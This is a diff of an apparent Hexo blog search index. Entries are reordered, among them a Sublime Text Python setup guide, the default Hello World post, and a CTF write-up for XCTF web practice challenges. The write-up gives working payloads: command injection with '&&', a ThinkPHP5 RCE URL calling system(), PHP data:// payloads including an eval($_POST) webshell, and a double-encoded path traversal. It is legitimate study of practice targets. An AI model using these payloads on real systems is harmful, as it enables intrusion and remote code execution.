-<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython02.png" alt="89d3fe035435cc1dc56fff80ffd225fc.png"></p>
-<p>中文成功输出，证明配置好了，但还需要按一个插件来支持 input</p>
-<p>安装SublimeREPL插件，使Sublime支持input</p>
-<p>安装好，试着调用。</p>
-<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">num</span> = <span class="function"><span class="title">input</span>(<span class="string">&quot;今天几月几日:&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="variable">num</span>)</span></span><br></pre></td></tr></table></figure>
-<p>跟 Ctrl+B 直接编译不同，利用插件来编译需要先手动 Ctrl+S 保存</p>
-<p><strong>常规调用：</strong></p>
-<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython03.png" alt="69d5a1b9e9dfe5c1aff1d2e1e1775f36.png"></p>
-<p>然后弹出一个新的框，进行输入输出。</p>
-<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython04.png" alt="fbe8fc6a38764b3605c069357dafdf37.png"></p>
-<p><strong>设置快捷键调用：</strong></p>
-<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython05.png" alt="ded30527af9e541ca4cf0e79bf907cf2.png"></p>
-<p>左边是系统默认设置，我们在右边窗口输入以下设置（另一个 Alt + End 是终止编译的快捷键），Ctrl+S 保存</p>
-<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython06.png" alt="bc715187792b855d583c10db6cc44403.png"></p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[ </span><br><span class="line"><span class="code">    &#123; </span></span><br><span class="line"><span class="code">        &quot;keys&quot;: [&quot;f4&quot;], </span></span><br><span class="line"><span class="code">        &quot;caption&quot;: &quot;SublimeREPL: Python - RUN current file&quot;, </span></span><br><span class="line"><span class="code">        &quot;command&quot;: &quot;run_existing_windoww_command&quot;, </span></span><br><span class="line"><span class="code">        &quot;args&quot;: &#123; </span></span><br><span class="line"><span class="code">            &quot;id&quot;: &quot;repl_python_run&quot;, </span></span><br><span class="line"><span class="code">            &quot;file&quot;: &quot;config/Python/Main.sublime-menu&quot;</span></span><br><span class="line"><span class="code">        &#125; </span></span><br><span class="line"><span class="code">    &#125;,</span></span><br><span class="line"><span class="code">        &#123; </span></span><br><span class="line"><span class="code">            &quot;keys&quot;: [&quot;alt+end&quot;], </span></span><br><span class="line"><span class="code">            &quot;command&quot;: &quot;exec&quot;, </span></span><br><span class="line"><span class="code">            &quot;args&quot;: &#123;&quot;kill&quot;: true&#125; </span></span><br><span class="line"><span class="code">        &#125; </span></span><br><span class="line"><span class="code">]</span></span><br></pre></td></tr></table></figure>
-<p>切换不方便，可以打开两个视图：</p>
-<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython07.png" alt="c33682bb046be44ffbe99139d83ea249.png"></p>
-<p>本文参考：<br>链接：<a href="https://www.zhihu.com/question/22904994/answer/800236870">https://www.zhihu.com/question/22904994/answer/800236870</a></p>
-]]></content>
-      <categories>
-        <category>软件安装</category>
-      </categories>
-      <tags>
-        <tag>软件安装</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Xshell和Xftp与虚拟机的连接</title>
     <url>/2020/09/28/Xshell%E5%92%8CXftp%E4%B8%8E%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E8%BF%9E%E6%8E%A5/</url>
     <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="Xshell"><a href="#Xshell" class="headerlink" title="Xshell"></a>Xshell</h2><p>Xshell 是一个强大的安全终端模拟软件，它支持SSH1, SSH2, 以及Microsoft Windows 平台的TELNET 协议。Xshell 通过互联网到远程主机的安全连接以及它创新性的设计和特色帮助用户在复杂的网络环境中享受他们的工作。<br>Xshell可以在Windows界面下用来访问远端不同系统下的服务器，从而比较好的达到远程控制终端的目的。</p>
@@ -2115,6 +2115,20 @@
       </tags>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2020/10/18/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>binwalk安装使用</title>
     <url>/2020/01/18/binwalk%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<p>网上也有这个安装教程，我是看完之后根据自己的安装总结一下。以备以后使用。<br>这个软件就是对图片进行分析，看是否包含有文件压缩包。<br><span id="more"></span></p>
@@ -2133,20 +2147,6 @@
       <tags>
         <tag>软件安装</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2020/10/18/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
   <entry>
     <title>solidity简单语法</title>
@@ -2366,116 +2366,6 @@
       </tags>
   </entry>
   <entry>
-    <title>攻防世界Web WP</title>
-    <url>/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/</url>
-    <content><![CDATA[<h2 id="攻防世界WebWp"><a href="#攻防世界WebWp" class="headerlink" title="攻防世界WebWp"></a>攻防世界WebWp</h2><p>本文为攻防世界web区的writeup。<br><span id="more"></span></p>
-<p><a href="https://adworld.xctf.org.cn/">题目地址</a></p>
-<h3 id="view-source"><a href="#view-source" class="headerlink" title="view-source"></a>view-source</h3><p>打开直接右键得到flag。</p>
-<h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>robots是一个爬虫协议，规定了访客可以访问哪些文件，以.txt文本显示。在地址栏后添加robots.txt进入robots页面。<br>显示flag_ls_h3re.php，然后访问，得到flag。</p>
-<h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><p>.bak为电脑自动设置的备份文件。<br>直接地址添加/index.php.bak可得备份文件，打开可得flag。</p>
-<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>这道题两种做法<br>第一种：<br>直接f12，打开network，<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/01.png" alt="f3738a25ab605fb8b8784491c5d5d040.png"><br>然后在地址栏加入cookie.php<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/02.png" alt="06588c1507fd173426276b57b1bc78c6.png"><br>得到flag<br>第二种：bp<br>抓包<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/03.png" alt="47324d9ace2eb7d38401ec00e3d4712b.png"><br>然后在地址栏加入cookie.php，再次抓包<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/04.png" alt="58b7bd929b82db184ea5de4a06f57aa2.png"><br>也可得到flag。</p>
-<h3 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h3><p>打开后有个不能按的按钮，f12，发现属性为disabled<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/05.png" alt="fe780a899cc3c93e902cd2152b5affcc.png"><br>把这个删掉，刷新，得到flag。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/06.png" alt="a6f9938bcbbeea57a26079e2c846572f.png"></p>
-<h3 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h3><p>进去是这个页面，是爆破没错了。<br>先随便输入一下，弹窗提示为admin登录，那么用户名应该为admin了。接着就是弱口令，直接bp。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/07.png" alt="fc49e7907a0c4e73ea41c09d35a41fb0.png"><br>抓包，送到Intruder，payload选择passwords<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/08.png" alt="7747c15f7d116759e4663af4910c97f4.png"><br>开始爆破。<br>然后找到长度不一样的即为密码。<br>然后登录即可找到flag。</p>
-<h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><p>构造地址如下：<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/09.png" alt="ef06b27efbeaeceb70a6d0a74f699a78.png"><br>php是弱类型，所以’0’==0成立，b能是数字，可以构造b为数组b[]=5678，或者在b后加字母，比较时默认只比较数字部分。</p>
-<h3 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h3><p>这个就是简单的get，post了。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/10.png" alt="1186692dbbbcd5c3bb80c810b428c343.png"></p>
-<h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>提示ip地址为123.123.123.123<br>该题掌握X-Forwarded-For和Referer的知识：<br>简称XFF，代表客户端，是HTTP的请求端真实的IP。<br>Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。<br>用bp抓包修改<br>右键送到Repeater，添加X-Forwarded-For:123.123.123.123，go，显示如下页面<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/11.png" alt="d0eab203ed63605eade4469542c943dc.png"><br>还要构造referer。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/12.png" alt="5a7243e1dbb8e1ec66250fa2b5be76c3.png"><br>得出flag。</p>
-<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>这道题就是菜刀的基本使用。<br>打开菜刀输入url，<img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/13.png" alt="f9713fc76cf46bad206a7058fe79d3e5.png"><br>打开flag.txt得到flag。</p>
-<h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h3><p>这是命令执行漏洞，也就是用户通过浏览器在远程服务器上执行任意系统命令，这是第一次接触。参考了网上的wp。<br>先试一下本机127.0.0.1，有回显。<img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/14.png" alt="5552db0ea1c328d3cd82b16311af227b.png"><br>这个是可以添加连接符的，比如&amp;&amp;||等，这里试一下输入127.0.0.1&amp;&amp;dir<br>dir就是显示目录内容。<img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/15.png" alt="25da5b930a0600f6a16b047bd5ae061a.png"><br>回显有index.php<br>然后试试输入flag关键词</p>
-<blockquote>
-<p>127.0.0.1 &amp;&amp; find / -name “flag.*”</p>
-</blockquote>
-<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/16.png" alt="26fb9ef994a699ca100e4f2ba704627d.png"></p>
-<p>找到位置，然后开始输入</p>
-<blockquote>
-<p>127.0.0.1 &amp;&amp; cat /home/flag.txt</p>
-</blockquote>
-<p>得到flag。</p>
-<h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>查看源代码，是js代码。整理一下。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/17.png" alt="4be7a3fec6b950d9c10e7bb8c5ad816d.png"><br>代码功能是把一串用逗号分隔的数字按ascii转成字符串，然后输出。</p>
-<p>代码有很多没有用的变量，需要进行修改。<br>代码中有这样的ascii串，</p>
-<blockquote>
-<p>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</p>
-</blockquote>
-<p>转码后为55,56,54,79,115,69,114,116,107,49,50<br>再通过ascii转换<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/18.png" alt="281beda85aabf6c406af0984f3958bfb.png"><br>连起来就是flag。</p>
-<h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>提示说初始页面，想到index.html,不行又试了试index.php，到network里边响应头找到flag。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/19.png" alt="bf357a9dcbe4bc5f3b6c6ce1ebe5889f.png"></p>
-<h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>提示robots，先看看robots文件，<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/20.png" alt="4a00ff9dcd6407567359d55d029b173a.png"><br>有个fl0g.php，打开看看。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/21.png" alt="dafa7304aed10e61657aba39dc534c5a.png"><br>得到flag。</p>
-<h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>打开试了半天，不知道是干哈的，没办法，搜一下吧。是thinkphp5 rce漏洞，这个以前没有见过。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/22.png" alt="6c7f65ceff78de22ac1b3536a1421eec.png"><br><a href="https://blog.csdn.net/qq_40884727/article/details/101452478">ThinkPHP5.x rec漏洞分析与复现</a><br>先看一下thinkphp的版本号，然后对症下药。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/23.png" alt="71744c42f55e1c06d4fc2725917d0ca7.png"><br>然后去百度查找该版本poc。<br>查找flag，构造payload</p>
-<blockquote>
-<p><a href="http://111.198.29.45:53630/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22">http://111.198.29.45:53630/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22</a></p>
-</blockquote>
-<p>然后查看flag</p>
-<blockquote>
-<p><a href="http://111.198.29.45:53630/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22">http://111.198.29.45:53630/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22</a></p>
-</blockquote>
-<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/24.png" alt="0bd59f138ff2510526a68df393e9c74d.png"></p>
-<h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>php函数</p>
-<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/25.png" alt="623abf7bde3354bcbec59c622035b03a.png"></p>
-<p>可知程序过滤掉了page=参数传入php://</p>
-<p><strong>第一种方法（大小写绕过）：</strong></p>
-<blockquote>
-<p>strstr() 搜索字符串在另一字符串的第一次出现（区分大小写）。</p>
-<p>str_replace() 以其他字符替换字符串中的一些字符（区分大小写）。</p>
-</blockquote>
-<p>根据strstr的区分大小写，构造</p>
-<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/26.png" alt="5c39025de563306dd04b59f4b2590ed7.png"><br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/27.png" alt="85848961451ec6ac1dfb4bc5b0d32246.png"></p>
-<p>然后查看flag</p>
-<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/28.png" alt="8f1f7571cd26368cbe3ef524ac709ce7.png"></p>
-<p><strong>第二种（data://伪协议执行命令利用）</strong></p>
-<p>该题过滤了php://伪协议，可以使用其他协议，使用data://伪协议<br><em>data://伪协议</em><br>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是php代码，就会执行代码。<br>使用方法：</p>
-<blockquote>
-<p>data://text/plain;base64,xxxx(base64编码后的数据)</p>
-</blockquote>
-<p>&lt;?php system(“dir”)?&gt; base64编码后使用</p>
-<blockquote>
-<p><a href="http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIiKT8%2b">http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIiKT8%2b</a></p>
-</blockquote>
-<p>注意编码后+号要用url编码<br>&lt;?php system(“cat fl4gisisish3r3.php”)?&gt; base64编码后使用</p>
-<blockquote>
-<p><a href="http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==">http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==</a></p>
-</blockquote>
-<p>查看源代码可得到flag。</p>
-<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/29.png" alt="bf9fad42f730d52e509a19a34852fd96.png"></p>
-<p><strong>第三种方法(data://伪协议传木马）</strong></p>
-<p>&lt;?php eval($_POST[xiaohua]); ?&gt; base64加密后拼接</p>
-<blockquote>
-<p><a href="http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA/Pg==">http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA/Pg==</a></p>
-</blockquote>
-<p>菜刀连接（这个我连接时没有出现flag，可能不可行）</p>
-<h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p>打开是一个网址，点一遍后，发现只有报表中心跳转，进入了一个新页面。</p>
-<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/30.png" alt="e67caa63d8e5e1491213a85b291cafd8.png"></p>
-<p>注意那个id，这个是爆破，打开bp，然后选择数字，先从1到10000跑跑试试。</p>
-<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/31.png" alt="4c130f95e90194ed830347cc9c0a8559.png"></p>
-<p>然后得出2333。将id改为2333，得出flag。</p>
-<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>f12提示source.php,打开<img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/32.png" alt="ee16fb77a84e65023ab55faa42f75dda.png"><br>还有个hint.php</p>
-<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/33.png" alt="97468ca3d7f89f97cf74091854e0aba3.png"></p>
-<p>知道应该在这个ffffllllaaaagggg<br>接下来就是找这个文件了<br><strong>代码审计</strong><br>checkfile()函数</p>
-<ol>
-<li>定义了一个白名单：source.php和hint.php，判断$page是否为空、是否为字符串。</li>
-<li>判断$page是否在白名单里，若存在返回true；</li>
-<li>考虑到page有参数的情况，$_page是取出$page问号前的东西，然后再判断$_page是否在白名单里，若存在则返回true；</li>
-<li>如果上一步判断失败，则又考虑了url编码的问题，因为url在传入以后服务器会自动进行一次解码。因此传入二次编码后的内容，就可以使checkfile返回true。</li>
-</ol>
-<p>接下来就是一个一个试了</p>
-<blockquote>
-<p>mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string</p>
-</blockquote>
-<p>根据字符数执行一个多字节安全的 substr() 操作。 位置是从 str 的开始位置进行计数。 第一个字符的位置是 0。第二个字符的位置是 1，以此类推。</p>
-<blockquote>
-<p>mb_strpos ( string $haystack , string $needle [, int $offset = 0 [, string $encoding = mb_internal_encoding() ]] ) : int</p>
-</blockquote>
-<p>查找 string 在一个 string 中首次出现的位置。<br>第三个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：<br>最终在这样构造url得到：</p>
-<blockquote>
-<p><a href="http://111.198.29.45:34231/source.php?file=source.php%253f../../../../../ffffllllaaaagggg">http://111.198.29.45:34231/source.php?file=source.php%253f../../../../../ffffllllaaaagggg</a></p>
-</blockquote>
-<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/34.png" alt="8e9e5cfa2a8b6ed1f577273f92ae4eda.png"></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>数二公式</title>
     <url>/2021/04/28/%E6%95%B0%E4%BA%8C%E5%85%AC%E5%BC%8F/</url>
     <content><![CDATA[<h2 id="常微分方程"><a href="#常微分方程" class="headerlink" title="常微分方程"></a>常微分方程</h2><h3 id="一阶微分方程的种类与解法"><a href="#一阶微分方程的种类与解法" class="headerlink" title="一阶微分方程的种类与解法"></a>一阶微分方程的种类与解法</h3><div class="table-container">
@@ -2605,6 +2495,116 @@
 ]]></content>
       <tags>
         <tag>programming</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界Web WP</title>
+    <url>/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/</url>
+    <content><![CDATA[<h2 id="攻防世界WebWp"><a href="#攻防世界WebWp" class="headerlink" title="攻防世界WebWp"></a>攻防世界WebWp</h2><p>本文为攻防世界web区的writeup。<br><span id="more"></span></p>
+<p><a href="https://adworld.xctf.org.cn/">题目地址</a></p>
+<h3 id="view-source"><a href="#view-source" class="headerlink" title="view-source"></a>view-source</h3><p>打开直接右键得到flag。</p>
+<h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>robots是一个爬虫协议，规定了访客可以访问哪些文件，以.txt文本显示。在地址栏后添加robots.txt进入robots页面。<br>显示flag_ls_h3re.php，然后访问，得到flag。</p>
+<h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><p>.bak为电脑自动设置的备份文件。<br>直接地址添加/index.php.bak可得备份文件，打开可得flag。</p>
+<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>这道题两种做法<br>第一种：<br>直接f12，打开network，<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/01.png" alt="f3738a25ab605fb8b8784491c5d5d040.png"><br>然后在地址栏加入cookie.php<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/02.png" alt="06588c1507fd173426276b57b1bc78c6.png"><br>得到flag<br>第二种：bp<br>抓包<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/03.png" alt="47324d9ace2eb7d38401ec00e3d4712b.png"><br>然后在地址栏加入cookie.php，再次抓包<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/04.png" alt="58b7bd929b82db184ea5de4a06f57aa2.png"><br>也可得到flag。</p>
+<h3 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h3><p>打开后有个不能按的按钮，f12，发现属性为disabled<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/05.png" alt="fe780a899cc3c93e902cd2152b5affcc.png"><br>把这个删掉，刷新，得到flag。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/06.png" alt="a6f9938bcbbeea57a26079e2c846572f.png"></p>
+<h3 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h3><p>进去是这个页面，是爆破没错了。<br>先随便输入一下，弹窗提示为admin登录，那么用户名应该为admin了。接着就是弱口令，直接bp。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/07.png" alt="fc49e7907a0c4e73ea41c09d35a41fb0.png"><br>抓包，送到Intruder，payload选择passwords<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/08.png" alt="7747c15f7d116759e4663af4910c97f4.png"><br>开始爆破。<br>然后找到长度不一样的即为密码。<br>然后登录即可找到flag。</p>
+<h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><p>构造地址如下：<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/09.png" alt="ef06b27efbeaeceb70a6d0a74f699a78.png"><br>php是弱类型，所以’0’==0成立，b能是数字，可以构造b为数组b[]=5678，或者在b后加字母，比较时默认只比较数字部分。</p>
+<h3 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h3><p>这个就是简单的get，post了。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/10.png" alt="1186692dbbbcd5c3bb80c810b428c343.png"></p>
